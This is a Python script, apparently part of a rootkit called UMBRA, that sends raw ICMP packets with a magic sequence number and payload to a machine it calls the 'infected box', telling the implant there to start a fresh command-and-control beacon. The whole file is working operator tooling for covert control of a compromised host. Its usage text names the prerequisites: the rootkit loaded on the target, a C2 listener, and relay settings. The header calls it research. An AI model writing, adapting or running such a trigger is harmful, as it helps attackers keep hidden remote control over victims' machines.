#!/usr/bin/env python3

"""
ICMP Magic Trigger - UMBRA Rootkit
Sends an ICMP packet with magic sequence 1337 to order a fresh beacon generation.
UMBRA: kernel-residency research
"""

import socket
import struct
import sys
import time

MAGIC_SEQ = 1337
ICMP_ECHO_REQUEST = 8
PAYLOAD = b'UMBRA_RELAY_SIGNAL'

def calculate_checksum(data):
    checksum = 0
    
    for i in range(0, len(data), 2):
        if i + 1 < len(data):
            checksum += (data[i] << 8) + data[i+1]
        else:
            checksum += data[i] << 8
    
    checksum = (checksum >> 16) + (checksum & 0xffff)
    checksum += (checksum >> 16)
    
    checksum = ~checksum & 0xffff
    
    return checksum

def create_icmp_packet(packet_id, sequence):
    header = struct.pack('!BBHHH', 
                         ICMP_ECHO_REQUEST,  
                         0,                  
                         0,                  
                         packet_id,          
                         sequence)           
    
    packet = header + PAYLOAD
    checksum = calculate_checksum(packet)
    
    header = struct.pack('!BBHHH',
                         ICMP_ECHO_REQUEST,
                         0,
                         checksum,
                         packet_id,
                         sequence)
    
    return header + PAYLOAD

def send_magic_trigger(target_ip, count=3, interval=1.0):
    
    print(r"""
╔═══════════════════════════════════════════════════════╗
║       UMBRA ICMP BEACON REDEPLOY TRIGGER            ║
╚═══════════════════════════════════════════════════════╝

    _,--._.-,
   /\_r-,\_ )
.-.) _;='_/ (.;
 \ \'     \/S )
  L.'-. _.'|-'
 <_`-'\'_.'/
   `'-._( \   For you...
    ___   \\,      ___
    \ .'-. \\   .-'_. /
     '._' '.\\/.-'_.'
        '--``\('--'
              \\
              `\\,
                \|
    """)
    
    print(f"[*] Infected Box: {target_ip}")
    print(f"[*] Magic sequence: {MAGIC_SEQ}")
    print(f"[*] Sending {count} packets with interval of {interval}s")
    print()
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        sock.settimeout(2)
        
        success_count = 0
        
        for i in range(count):
            try:
                packet = create_icmp_packet(packet_id=1337, sequence=MAGIC_SEQ)
                
                sock.sendto(packet, (target_ip, 0))
                
                print(f"[+] Packet {i+1}/{count} sent [{len(packet)} bytes]")
                success_count += 1
                
                if i < count - 1:
                    time.sleep(interval)
                    
            except socket.error as e:
                print(f"[!] Error sending packet {i+1}: {e}")
        
        sock.close()
        
        print()
        print(f"[GG] {success_count}/{count} packets sent successfully")
        print()
        print("[*] A new beacon generation should be live within 5-15 seconds")
        print()
        
        return success_count > 0
        
    except PermissionError:
        print()
        print("[!] ERROR: Permission denied")
        print(f"[!] Run with: sudo {sys.argv[0]} {target_ip}")
        print()
        return False
        
    except socket.gaierror:
        print()
        print(f"[!] ERROR: Invalid address: {target_ip}")
        print()
        return False
        
    except Exception as e:
        print()
        print(f"[!] ERROR: {e}")
        print()
        return False

def show_usage():
    print(f"""
Use: sudo {sys.argv[0]} <TARGET_IP> [OPTIONS]

Arguments:
    TARGET_IP       IP of the machine infected with UMBRA

Options:
    -c, --count N   Number of packets to send (default: 3)
    -i, --interval  Inter-packet interval in seconds (default: 1.0)
    -h, --help      Show this msg

Examples:
    sudo {sys.argv[0]} 192.168.1.100
    sudo {sys.argv[0]} 10.0.0.50 -c 5 -i 0.5

Prerequisites:
    1. UMBRA loaded on the target with ub_beacon_url set
    2. Matching C2 listener active for the configured implant
    3. UB_RELAY_ADDR set to this host in include/relay.h
    """)

def main():
    
    if len(sys.argv) < 2 or '-h' in sys.argv or '--help' in sys.argv:
        show_usage()
        sys.exit(0 if '-h' in sys.argv or '--help' in sys.argv else 1)
    
    target_ip = sys.argv[1]
    count = 3
    interval = 1.0
    
    i = 2
    while i < len(sys.argv):
        if sys.argv[i] in ['-c', '--count']:
            if i + 1 < len(sys.argv):
                try:
                    count = int(sys.argv[i + 1])
                    i += 2
                    continue
                except ValueError:
                    print(f"[!] Invalid value for count: {sys.argv[i + 1]}")
                    sys.exit(1)
        
        if sys.argv[i] in ['-i', '--interval']:
            if i + 1 < len(sys.argv):
                try:
                    interval = float(sys.argv[i + 1])
                    i += 2
                    continue
                except ValueError:
                    print(f"[!] Invalid value for interval: {sys.argv[i + 1]}")
                    sys.exit(1)
        
        print(f"[!] Unknown option: {sys.argv[i]}")
        sys.exit(1)
    
    if count < 1 or count > 10:
        print("[!] Count must be between 1 and 10")
        sys.exit(1)
    
    if interval < 0.1 or interval > 10.0:
        print("[!] Interval must be between 0.1 and 10.0 seconds")
        sys.exit(1)
    
    success = send_magic_trigger(target_ip, count, interval)
    
    sys.exit(0 if success else 1)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print()
        print("[!] Stopped")
        sys.exit(130)
